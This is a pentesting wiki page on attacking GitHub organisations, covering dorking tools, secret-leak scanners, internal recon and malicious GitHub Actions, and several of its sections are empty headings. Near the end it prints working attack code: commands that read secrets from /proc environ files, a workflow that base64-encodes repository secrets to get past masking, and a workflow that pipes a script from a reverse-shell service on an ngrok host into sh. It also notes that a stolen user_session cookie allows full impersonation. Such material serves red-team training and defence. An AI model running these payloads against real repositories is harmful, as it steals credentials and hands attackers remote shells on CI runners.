# Github Security

## What is Github

(From [here](https://kinsta.com/knowledgebase/what-is-github/)) At a high level, **GitHub is a website and cloud-based service that helps developers store and manage their code, as well as track and control changes to their code**.

### Basic Information

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## External Recon

Github repositories can be configured as public, private and internal.&#x20;

* **Private** means that **only** people of the **organisation** will be able to access them
* **Internal** means that **only** people of the **enterprise** (an enterprise may have several organisations) will be able to access it
* **Public** means that **all internet** is going to be able to access it.

In case you know the **user, repo or organisation you want to target** you can use **github dorks** to find sensitive information or search for **sensitive information leaks** **on each repo**.

### Github Dorks

Github allows to **search for something specifying as scope a user, a repo or an organisation**. Therefore, with a list of strings that are going to appear close to sensitive information you can easily **search for potential sensitive information in your target**.

Tools (each tool contains its list of dorks):

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Dorks list](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Dorks list](https://github.com/hisxo/gitGraber/tree/master/wordlists))

### Github Leaks

Please, note that the github dorks are also meant to search for leaks using github search options. This section is dedicated to those tools that will **download each repo and search for sensitive information in them** (even checking certain depth of commits).

Tools (each tool contains its list of regexes):

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

## Internal Recon

### With User Credentials

If you somehow already have credentials for a user inside an organization you can **just login** and check which **enterprise and organization roles you have**, if you are a raw member, check which **permissions raw members have**, in which **groups** you are, which **permissions you have** over which **repos,** and **how are the repos protected.**

Note that **2FA may be used** so you will only be able to access this information if you can also **pass that check**.

{% hint style="info" %}
Note that if you **manage to steal the `user_session` cookie** (currently configured with SameSite: Lax) you can **completely impersonate the user** without needing credentials or 2FA.
{% endhint %}

### With User SSH Key

#### GPG Keys

### With User Token

### With Oauth Application

### With Github Application

### With Malicious Github Action

In case you can **execute arbitrary github actions** in a **repository**, you can **steal the secrets from that repo**.

In case members of an organization can **create new repos** and you can execute github actions, you can **create a new repo and steal the secrets set at organization level**.

In case you somehow managed to **infiltrate inside a Github Action**, if you can escalate privileges you can **steal secrets from the processes the secrets have been set in**. In some cases you don't even need to escalate privileges.

```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```

#### List secrets in Github Action output

```yaml
name: list_env
on:
  workflow_dispatch:
jobs:     
  List_env:
    runs-on: ubuntu-latest
    steps:
      - name: List Env
        # Need to base64 encode or github will change the secret value for "***"
        run: sh -c 'env | grep "secret_" | base64 -w0'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

#### Get reverse shell with secrets

```yaml
name: revshell
on:
  workflow_dispatch:
jobs:     
  create_pull_request:
    runs-on: ubuntu-latest
    steps:
      - name: Get Rev Shell
        run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

### Bypassing Branch Protection
